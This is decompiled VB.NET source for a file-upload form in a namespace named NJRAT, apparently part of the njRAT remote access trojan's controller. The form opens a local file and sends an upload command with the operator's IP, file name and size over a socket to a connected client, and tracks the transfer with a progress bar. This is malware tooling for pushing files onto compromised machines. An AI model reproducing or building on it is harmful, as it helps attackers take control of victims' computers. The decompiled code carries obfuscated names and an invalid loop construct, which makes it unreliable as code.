Imports System
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports Microsoft.VisualBasic.CompilerServices

Namespace NJRAT
	' Token: 0x02000021 RID: 33
	<DesignerGenerated()>
	Public Partial Class up
		Inherits Form

		' Token: 0x06000564 RID: 1380 RVA: 0x00030E2C File Offset: 0x0002F02C
		<DebuggerNonUserCode()>
		Private Shared Sub __ENCAddToList(value As Object)
			Dim _ENCList As List(Of WeakReference) = up.__ENCList
			SyncLock _ENCList
				If up.__ENCList.Count = up.__ENCList.Capacity Then
					Dim num As Integer = 0
					Dim num2 As Integer = 0
					Dim num3 As Integer = up.__ENCList.Count - 1
					Dim num4 As Integer = num2
					While True
						Dim num5 As Integer = num4
						Dim num6 As Integer = num3
						If num5 > num6 Then
							Exit For
						End If
						Dim weakReference As WeakReference = up.__ENCList(num4)
						If weakReference.IsAlive Then
							If num4 <> num Then
								up.__ENCList(num) = up.__ENCList(num4)
							End If
							num += 1
						End If
						num4 += 1
					End While
					up.__ENCList.RemoveRange(num, up.__ENCList.Count - num)
					up.__ENCList.Capacity = up.__ENCList.Count
				End If
				up.__ENCList.Add(New WeakReference(RuntimeHelpers.GetObjectValue(value)))
			End SyncLock
		End Sub

		' Token: 0x170001F2 RID: 498
		' (get) Token: 0x06000567 RID: 1383 RVA: 0x00031790 File Offset: 0x0002F990
		' (set) Token: 0x06000568 RID: 1384 RVA: 0x000030CF File Offset: 0x000012CF
		Friend Overridable Property ProgressBar1 As ProgressBar
			<DebuggerNonUserCode()>
			Get
				Return Me._ProgressBar1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ProgressBar)
				Me._ProgressBar1 = value
			End Set
		End Property

		' Token: 0x170001F3 RID: 499
		' (get) Token: 0x06000569 RID: 1385 RVA: 0x000317A8 File Offset: 0x0002F9A8
		' (set) Token: 0x0600056A RID: 1386 RVA: 0x000317C0 File Offset: 0x0002F9C0
		Friend Overridable Property vmethod_4 As Timer
			<DebuggerNonUserCode()>
			Get
				Return Me._vmethod_4
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Timer)
				Dim value2 As EventHandler = AddressOf Me.vmethod_4_Tick
				If Me._vmethod_4 IsNot Nothing Then
					RemoveHandler Me._vmethod_4.Tick, value2
				End If
				Me._vmethod_4 = value
				If Me._vmethod_4 IsNot Nothing Then
					AddHandler Me._vmethod_4.Tick, value2
				End If
			End Set
		End Property

		' Token: 0x170001F4 RID: 500
		' (get) Token: 0x0600056B RID: 1387 RVA: 0x00031818 File Offset: 0x0002FA18
		' (set) Token: 0x0600056C RID: 1388 RVA: 0x000030D8 File Offset: 0x000012D8
		Friend Overridable Property FormSkin1 As FormSkin
			<DebuggerNonUserCode()>
			Get
				Return Me._FormSkin1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As FormSkin)
				Me._FormSkin1 = value
			End Set
		End Property

		' Token: 0x170001F5 RID: 501
		' (get) Token: 0x0600056D RID: 1389 RVA: 0x00031830 File Offset: 0x0002FA30
		' (set) Token: 0x0600056E RID: 1390 RVA: 0x000030E1 File Offset: 0x000012E1
		Friend Overridable Property FlatGroupBox1 As FlatGroupBox
			<DebuggerNonUserCode()>
			Get
				Return Me._FlatGroupBox1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As FlatGroupBox)
				Me._FlatGroupBox1 = value
			End Set
		End Property

		' Token: 0x170001F6 RID: 502
		' (get) Token: 0x0600056F RID: 1391 RVA: 0x00031848 File Offset: 0x0002FA48
		' (set) Token: 0x06000570 RID: 1392 RVA: 0x000030EA File Offset: 0x000012EA
		Friend Overridable Property Lv1 As GClass9
			<DebuggerNonUserCode()>
			Get
				Return Me._Lv1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As GClass9)
				Me._Lv1 = value
			End Set
		End Property

		' Token: 0x170001F7 RID: 503
		' (get) Token: 0x06000571 RID: 1393 RVA: 0x00031860 File Offset: 0x0002FA60
		' (set) Token: 0x06000572 RID: 1394 RVA: 0x000030F3 File Offset: 0x000012F3
		Friend Overridable Property ColumnHeader1 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader1 = value
			End Set
		End Property

		' Token: 0x170001F8 RID: 504
		' (get) Token: 0x06000573 RID: 1395 RVA: 0x00031878 File Offset: 0x0002FA78
		' (set) Token: 0x06000574 RID: 1396 RVA: 0x000030FC File Offset: 0x000012FC
		Friend Overridable Property ColumnHeader2 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader2 = value
			End Set
		End Property

		' Token: 0x170001F9 RID: 505
		' (get) Token: 0x06000575 RID: 1397 RVA: 0x00031890 File Offset: 0x0002FA90
		' (set) Token: 0x06000576 RID: 1398 RVA: 0x000318A8 File Offset: 0x0002FAA8
		Friend Overridable Property Button1 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button1_Click_1
				If Me._Button1 IsNot Nothing Then
					RemoveHandler Me._Button1.Click, value2
				End If
				Me._Button1 = value
				If Me._Button1 IsNot Nothing Then
					AddHandler Me._Button1.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170001FA RID: 506
		' (get) Token: 0x06000577 RID: 1399 RVA: 0x00031900 File Offset: 0x0002FB00
		' (set) Token: 0x06000578 RID: 1400 RVA: 0x00031918 File Offset: 0x0002FB18
		Friend Overridable Property FlatButton2 As FlatButton
			<DebuggerNonUserCode()>
			Get
				Return Me._FlatButton2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As FlatButton)
				Dim value2 As EventHandler = AddressOf Me.FlatButton2_Click
				If Me._FlatButton2 IsNot Nothing Then
					RemoveHandler Me._FlatButton2.Click, value2
				End If
				Me._FlatButton2 = value
				If Me._FlatButton2 IsNot Nothing Then
					AddHandler Me._FlatButton2.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170001FB RID: 507
		' (get) Token: 0x06000579 RID: 1401 RVA: 0x00031970 File Offset: 0x0002FB70
		' (set) Token: 0x0600057A RID: 1402 RVA: 0x00003105 File Offset: 0x00001305
		Friend Overridable Property FlatMini1 As FlatMini
			<DebuggerNonUserCode()>
			Get
				Return Me._FlatMini1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As FlatMini)
				Me._FlatMini1 = value
			End Set
		End Property

		' Token: 0x0600057B RID: 1403 RVA: 0x00031988 File Offset: 0x0002FB88
		Public Sub New()
			AddHandler MyBase.FormClosing, AddressOf Me.up_FormClosing
			AddHandler MyBase.Load, AddressOf Me.up_Load
			up.__ENCAddToList(Me)
			Me.Closinge = False
			Me.os = 0
			Me.InitializeComponent()
		End Sub

		' Token: 0x0600057C RID: 1404 RVA: 0x00002050 File Offset: 0x00000250
		Private Sub Button1_Click(sender As Object, e As EventArgs)
		End Sub

		' Token: 0x0600057D RID: 1405 RVA: 0x000319DC File Offset: 0x0002FBDC
		Private Sub up_FormClosing(sender As Object, e As FormClosingEventArgs)
			Me.Closinge = True
			Try
				Me.FS.Close()
				Me.FS.Dispose()
			Catch ex As Exception
			End Try
			Try
				Me.sk.Close()
			Catch ex2 As Exception
			End Try
		End Sub

		' Token: 0x0600057E RID: 1406 RVA: 0x00031A50 File Offset: 0x0002FC50
		Private Sub up_Load(sender As Object, e As EventArgs)
			Me.FS = New FileStream(Me.TMP, FileMode.Open)
			Me.Lv1.Items(0).SubItems(0).Text = New FileInfo(Me.TMP).Name
			Me.Lv1.Items(1).SubItems(0).Text = Class6.smethod_17(CLng(Me.SZ))
			Me.Lv1.Items(2).SubItems(0).Text = Class6.smethod_17(0L)
			Me.Lv1.Items(3).SubItems(0).Text = Class6.smethod_17(0L)
			Me.ProgressBar1.Maximum = Me.SZ
			Me.osk.Send(String.Concat(New String() { "Ex", Class7.string_1, "fm", Class7.string_1, "up", Class7.string_1, Me.osk.ip(), Class7.string_1, Class6.smethod_14(Me.FN), Class7.string_1, Conversions.ToString(Me.SZ) }))
			Me.Lv1.method_3()
			Me.vmethod_4.Enabled = True
		End Sub

		' Token: 0x0600057F RID: 1407 RVA: 0x00031BDC File Offset: 0x0002FDDC
		Private Sub vmethod_4_Tick(sender As Object, e As EventArgs)
			Try
				Me.Lv1.Items(2).SubItems(1).Text = Class6.smethod_17(CLng((Me.ProgressBar1.Value - Me.os)))
				Me.os = Me.ProgressBar1.Value
				Me.Lv1.Items(3).SubItems(1).Text = Class6.smethod_17(CLng(Me.ProgressBar1.Value))
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000580 RID: 1408 RVA: 0x00002199 File Offset: 0x00000399
		Private Sub FlatButton2_Click(sender As Object, e As EventArgs)
			Me.Close()
		End Sub

		' Token: 0x06000581 RID: 1409 RVA: 0x00002199 File Offset: 0x00000399
		Private Sub Button1_Click_1(sender As Object, e As EventArgs)
			Me.Close()
		End Sub

		' Token: 0x0400027E RID: 638
		Private Shared __ENCList As List(Of WeakReference) = New List(Of WeakReference)()

		' Token: 0x04000280 RID: 640
		<AccessedThroughProperty("ProgressBar1")>
		Private _ProgressBar1 As ProgressBar

		' Token: 0x04000281 RID: 641
		<AccessedThroughProperty("vmethod_4")>
		Private _vmethod_4 As Timer

		' Token: 0x04000282 RID: 642
		<AccessedThroughProperty("FormSkin1")>
		Private _FormSkin1 As FormSkin

		' Token: 0x04000283 RID: 643
		<AccessedThroughProperty("FlatGroupBox1")>
		Private _FlatGroupBox1 As FlatGroupBox

		' Token: 0x04000284 RID: 644
		<AccessedThroughProperty("Lv1")>
		Private _Lv1 As GClass9

		' Token: 0x04000285 RID: 645
		<AccessedThroughProperty("ColumnHeader1")>
		Private _ColumnHeader1 As ColumnHeader

		' Token: 0x04000286 RID: 646
		<AccessedThroughProperty("ColumnHeader2")>
		Private _ColumnHeader2 As ColumnHeader

		' Token: 0x04000287 RID: 647
		<AccessedThroughProperty("Button1")>
		Private _Button1 As Button

		' Token: 0x04000288 RID: 648
		<AccessedThroughProperty("FlatButton2")>
		Private _FlatButton2 As FlatButton

		' Token: 0x04000289 RID: 649
		<AccessedThroughProperty("FlatMini1")>
		Private _FlatMini1 As FlatMini

		' Token: 0x0400028A RID: 650
		Public Closinge As Boolean

		' Token: 0x0400028B RID: 651
		Public FN As String

		' Token: 0x0400028C RID: 652
		Public FS As FileStream

		' Token: 0x0400028D RID: 653
		Public os As Integer

		' Token: 0x0400028E RID: 654
		Public osk As Client

		' Token: 0x0400028F RID: 655
		Public sk As Client

		' Token: 0x04000290 RID: 656
		Public SZ As Integer

		' Token: 0x04000291 RID: 657
		Public TMP As String
	End Class
End Namespace
